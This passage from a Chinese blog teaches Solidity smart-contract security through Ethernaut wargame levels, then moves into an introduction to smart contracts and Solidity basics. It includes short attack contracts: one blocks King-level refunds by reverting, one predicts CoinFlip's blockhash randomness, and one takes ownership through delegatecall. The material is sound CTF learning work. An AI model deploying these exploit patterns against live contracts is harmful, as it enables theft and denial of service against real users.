<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233101.jpg" alt="img"></p>
<p>但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233102.jpg" alt="img"></p>
<p>这里的0x2b9….69ae就是合约部署之后的地址。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233103.jpg" alt="img"></p>
<p>\5. Access Control 访问控制</p>
<p>访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。</p>
<ul>
<li>public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数</li>
<li>external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 this.func() 外部调用的方式调用该函数</li>
<li>private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）</li>
<li>internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）</li>
</ul>
<p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code>和 <code>delegatecall</code>：</p>
<ul>
<li><code>call</code> 的外部调用上下文是外部合约</li>
<li><code>delegatecall</code> 的外部调用上下文是调用合约上下文</li>
</ul>
<p>DELEGATECALL基本就是说“我是一个合约，我授权（delegating）你对我的storage做任何事情”。delegatecall的安全问题是它必须要能够信任接收方的合约会善待它的storage。DELEGATECALL是对CALLCODE的改进，因为CALLCODE不保存msg.send和msg.value。譬如如果A调用B，B又DELEGATECALL给C，那么在DELEGATECALL中的msg.sender是A，而在CALLCODE中的msg.sender是B。</p>
<p>如果A使用CALL调用B，那么B的代码的运行上下文就是B；如果A使用DELEGATECALL调用B，那么B的代码的运行上下文是A的上下文。简单的用图表示就是：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233104.jpg" alt="img"></p>
<p>有了这些背景知识，我们来看一下Ethernaut中的题目，第六关delegation。过关要求是要成为合约实例的owner。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function Delegate(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    function pwn() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    function Delegation(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        if (delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路其实是很清晰，因为<code>Delegation</code>合约中的<code>delegatecall</code>函数参数可控，导致可以在合约内部执行任意函数，只需调用<code>Delegate</code>合约中的<code>pwn</code>函数，即可将 owner 变成自己。这里需要注意的问题是，delegatecall的参数问题。不是直接把函数名字传递过去。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233105.jpg" alt="img"></p>
<p>原因是，这里需要知道**Ethereum Virtual Machine(EVM)**如何确定执行合约的哪个函数。合约最后都会被编译成bytecode，而发起一个transaction要执行合约里的某个函数时，交易里的data字段同样也是bytecode而不是人看得懂的函数名称。 以一个简单的合约为例：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Multiply &#123;</span><br><span class="line"></span><br><span class="line">   function multiply(int x, int y) constant returns(int) &#123;</span><br><span class="line"></span><br><span class="line">       return x*y; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译完的bytecode：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6060604052341561000c57fe5b5b60ae8061001b6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c4308a814603a575bfe5b3415604157fe5b605e60048080359060200190919080359060200190919050506074565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820c40f61d36a3a1b7064b58c57c89d5c3d7c73b9116230f9948806b11836d2960c0029</span><br></pre></td></tr></table></figure>

<p>如果要执行multiply函数，算出8*7等于多少，transaction里的data字段会是</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3c4308a800000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000007</span><br></pre></td></tr></table></figure>

<p>分成三个部分： 第一个是四个byte的3c4308a8，第二和第三个分别是32 byte长的参数，8和7。</p>
<p><strong>3c4308a8</strong>是multiply函式的 <strong>signature</strong>，是取函数名称和参数类型进行哈希后取前四个byte而得（不包含 <code>0x</code> ）：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sha3(&quot;multiply(int256,int256)&quot;));</span><br><span class="line">//0x3c4308a8851ef99b4bfa5ffd64b68e5f2b4307725b25ad0d14040bdb81e3bafcsha3(&quot;multiply(int256,int256)&quot;)).substr(2,8);</span><br><span class="line">//3c4308a8</span><br></pre></td></tr></table></figure>

<p>EVM就是靠函式的signature来知道该执行哪个函式的。在合约编译完的bytecode里搜寻也能找到此signature。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233106.jpg" alt="img"></p>
<p>\6. DoS拒绝服务攻击</p>
<p>拒绝服务攻击。</p>
<p>这里参看Ethernaut的第九关，king。</p>
<p>合约代码逻辑很简单，谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King 的位置，需要解题者阻止其他人成为 King。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233107.jpg" alt="img"></p>
<p>然后提交一些币。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233108.jpg" alt="img"></p>
<p>回顾一下 Solidity 中几种转币方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.transfer()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.send()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.call.value()()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）</li>
</ul>
<p>当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 <code>transfer()</code>。上面提到，当 <code>transfer()</code> 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。</p>
<p>部署一个新的合约，当收到转账时主动抛出错误。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\7. Bad Randomness - 可预测的随机处理</p>
<p>伪随机问题一直都存在于现代计算机系统中，但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件</p>
<ul>
<li>连续猜对 10 次</li>
</ul>
<p><code>FACTOR</code> 为 2^255，<code>coinFlip</code> 结果只会为 1 或 0<br>相当于一个猜硬币正反面的游戏</p>
<p>这是经典的区块链伪随机数的问题。<br>在以太坊智能合约中编写的基于随机数的处理逻辑是十分危险的，因为区块链上的数据是公开的，所有人都可以看见，利用公开的数据来生成随机数是不明智的。<br>此外，像 <code>timestamps</code> 这样矿工可控的数据也不宜作为种子。</p>
<p>在这道题中，出题人利用 <code>block.blockhash(block.number-1)</code> 来生成随机数，这是可预测的。我们可以部署一个新的合约，先进行随机数的预测，再进行竞猜。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = instance_address_here;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function Attack() &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function predict() public view returns (bool)&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    return coinFlip == 1 ? true : false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需调用 10 次 <code>hack()</code> 函数即可。</p>
<p>P.S.</p>
<ol>
<li>遇上了meatamask 无限转圈的问题，最后发现是版本问题，下载一个老版本就行。但是extension store没有老版本，后来还是github上发现，在chrome:&#x2F;&#x2F;extensions右上角打开开发者模式，然后可以选择文件夹。</li>
</ol>
<p><strong>参考：</strong></p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md">https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/TurkeyCock/article/details/80485391">以太坊交易源码分析 - 鑫鑫点灯 - CSDN博客</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/148341">https://www.anquanke.com/post/id/148341</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.colabug.com/4089704.html">Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse them</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32320">干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-1：可重入漏洞、算法上下溢出</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/632/">Solidity 安全：已知攻击方法和常见防御模式综合列表</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.cnblogs.com/iamstudy/articles/ethernaut_game_wp_1.html">智能合约 - Ethernaut Game（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/trufflesuite/truffle-contract%23sending-ether--triggering-the-fallback-function">trufflesuite&#x2F;truffle-contract</a></li>
<li><a href="https://link.zhihu.com/?target=http://orchome.com/966">以太坊ABI介绍 - OrcHome</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/08/09/understand-abi/">如何理解以太坊ABI - 应用程序二进制接口</a></li>
<li><a href="https://link.zhihu.com/?target=http://remix.ethereum.org/%23optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js">http://remix.ethereum.org/#optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/304b99bfef3d">metamask 无限转圈 loading</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/601/">以太坊智能合约安全入门了解一下（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/607/">以太坊智能合约安全入门了解一下（下）</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Difference between CALL, CALLCODE and DELEGATECALL</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/how-to-build-updateable-smart-contract-part-1">教程 | 在区块链上建立可更新的智慧合约(一)</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/152590">Solidity中的delegatecall杂谈 - 安全客，安全资讯平台</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.bubbles966.cn/blog/2018/05/07/analyse_dapp_by_ethernaut_2/">从Ethernaut学习智能合约审计(二) - Bubbles~blog</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834</a></li>
</ol>
<h1 id="区块链技术14-智能合约和solidity简介"><a href="#区块链技术14-智能合约和solidity简介" class="headerlink" title="区块链技术14:智能合约和solidity简介"></a>区块链技术14:智能合约和solidity简介</h1><p>首先要强调的是，以太坊和比特币的区别。比特币主要用途是用于进行交易，定位是数字货币的支付功能。以太坊相比比特币是一个巨大的提升，将区块链的应用边界从货币和支付扩大到了更广的领域（通过智能合约实现）。</p>
<p>区块链2.0是更宏观的对整个市场去中心化，利用区块链技术来转换许多不同的数字资产，通过转让来创建不同资产的价值。区块链技术的去中心化账本功能可以被用来创建、确认、转移各种不同类型的资产及合约。几乎所有类型的金融交易都可以被改造成在区块链上使用，包括股票、私募股权、众筹、债券和其他类型的金融衍生品如期货、期权等。</p>
<p>那什么是智能合约呢？</p>
<p>智能合约不是一定要用区块链来实现，很久之前就已经出现了：比如微信和支付宝的信用卡自动还款，也是一种智能合约。当还款日到了，还款条件也满足（支付宝的余额宝、微信支付余额或者银行储蓄卡中余额充足），系统会自动进行还款，这些都是智能合约，也没有使用区块链技术。</p>
<p>而使用区块链的话，结合不可篡改数据无法删除、修改，只能新增，保证了历史的可追溯，同时作恶的成本将很高，因为其作恶行为将被永远记录，同时拥有高可靠性，用户不用担心系统在条件被满足时不执行合约；然后就是去中心化带来的全网备份，完备的记录完全可以支持支持事后的审计，避免了中心化因素的影响。所以可以想象，以太坊通过在区块链上提供了图灵完备语言，打开了多么大的一个市场。</p>
<p>举一个例子，看看以太坊上的应用：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233109.jpg" alt="img"></p>
<p>谜恋猫是世界首款区块链游戏。“区块链”是支持类似比特币这样的加密货币的运作技术基础。尽管谜恋猫不是数字货币，但它也能提供同样的安全保障：每一只谜恋猫都是独一无二的，而且100%归用户所有。它无法被复制、拿走、或销毁。</p>
<p>迷恋猫官方将他们设计的迷恋猫合约发布到了以太坊上，并公布了合约内容，其中规定了0代猫只能有他们的CEO、COO来产生，并限定的0代猫最多产生的数量，以及玩家之间如何交易猫，两只猫咪之间如何繁育、猫咪备孕周期等等规则，以上规则已经在以太坊上做了公证，以后只能按照这套规则来进行游戏。<br>在区块链平台上的每只猫咪其实只是存在以太坊中的一段猫咪基因编码，该段基因编码决定了猫咪的属性、外貌等，迷恋猫官方在以太坊之外，提供了一个网站，在网站上将这些猫咪根据其基因编码展示出来。玩家可以使用自己的以太坊帐户去购买这些猫咪，并将自己的猫咪去与其他玩家的猫咪繁育以产生下一代猫咪，或者继续将其拍卖，猫咪之间繁育之后产生的下一代猫咪，其基因编码是受其两只上一代猫咪基因编码影响的，由于猫咪的基因编码在以太坊上都是公开的，所以迷恋猫官方并未公布下一代基因编码的生成规则，这样玩家也无法人为的控制，使用两只特定基因的猫来繁育出具有特定稀有属性的下一代。 玩家在以太坊的帐户是由一段特殊的密钥保护的，玩家进行购买猫咪、繁育猫咪操作事，这些操作信息都会被发布到以太坊上时，并且这些操作行为都会使用玩家的密钥进行认证，并在以太坊上记录，其公之于众。所以所有人都可以看到玩家A买了一只猫咪Kitty101，玩家B将他的猫咪Kitty201与他的Kitty202进行了繁育，并生下了一只什么样基因的Kitty301。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233110.jpg" alt="img"></p>
<p>在此之后，区块链上发布了不少游戏，而今年暑假的两款游戏（Fomo3d和LastWinner）吸引了大量的眼球，同时也可能预示着在以太坊上游戏开发的没落。Fomo3d的黑客攻击技巧可以参看<a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">1</a>和<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">2</a>。</p>
<p>那由此可以看到，比太币和以太坊底层框架本身，当前攻击较少；但是在以太坊上，智能合约本身的代码问题是安全的重灾区。</p>
<p>那接下来，我们讨论下，solodity语言，对智能合约有一个基本的了解。</p>
<p>我们使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix IDE</a>来查看智能合约的效果。</p>
<p>首先看最基本的语法和使用情况。</p>
<ol>
<li>test_2.sol 最基本的用法</li>
</ol>
<p>以下的代码中，除了第一行和第二行中的contract，其实就和其他我们比较熟悉的语言差不多。将代码拷贝到remix之中，然后deploy到链上去，就是智能合约了。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    //交换传入值的顺序并返回</span><br><span class="line">    function f(uint key, uint value) returns (uint, uint)&#123; </span><br><span class="line">        return (value, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function g() public view returns (uint, uint)&#123;</span><br><span class="line">        //任意顺序的通过变量名来指定参数值</span><br><span class="line">        return f(&#123;value: 2, key: 1&#125;);//2,1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function h() public view returns (uint)&#123;</span><br><span class="line">        uint a = 3;</span><br><span class="line">        uint b = 4;</span><br><span class="line">        return a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233111.jpg" alt="img"></p>
<p>第一行就是告诉大家源代码使用Solidity版本0.4.0写的，并且使用0.4.0以上版本运行也没问题（最高到0.5.0，但是不包含0.5.0）。这是为了确保合约不会在新的编译器版本中突然行为异常。关键字 <code>pragma</code> 的含义是，一般来说，pragmas（编译指令）是告知编译器如何处理源代码的指令的（例如， <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Pragma_once">pragma once</a> ）。</p>
<p>Solidity中合约的含义就是一组代码（它的 <em>函数</em> )和数据（它的 <em>状态</em> ），它们位于以太坊区块链的一个特定地址上。 </p>
<p>这个合约中有三个函数，f逆序返回参数中的两个值；g调用f；h计算两个数字的和。</p>
<ol start="2">
<li>存储</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码行 <code>uint</code> <code>storedData;</code> 声明一个类型为 <code>uint</code> (256位无符号整数）的状态变量，叫做 <code>storedData</code> 。 你可以认为它是数据库里的一个位置，可以通过调用管理数据库代码的函数进行查询和变更。对于以太坊来说，上述的合约就是拥有合约（owning contract）。在这种情况下，函数 <code>set</code> 和 <code>get</code> 可以用来变更或取出变量的值。</p>
<p>要访问一个状态变量，并不需要像 <code>this.</code> 这样的前缀，虽然这是其他语言常见的做法。</p>
<p>该合约能完成的事情并不多（由于以太坊构建的基础架构的原因）：它能允许任何人在合约中存储一个单独的数字，并且这个数字可以被世界上任何人访问，且没有可行的办法阻止你发布这个数字。当然，任何人都可以再次调用 <code>set</code> ，传入不同的值，覆盖你的数字，但是这个数字仍会被存储在区块链的历史记录中。随后，我们会看到怎样施加访问限制，以确保只有你才能改变这个数字。</p>
<ol start="3">
<li>以上是单个合约。那我们来试一下在不同的合约之中进行交互。(test_<em>send.sol和simple_set.sol</em>)</li>
</ol>
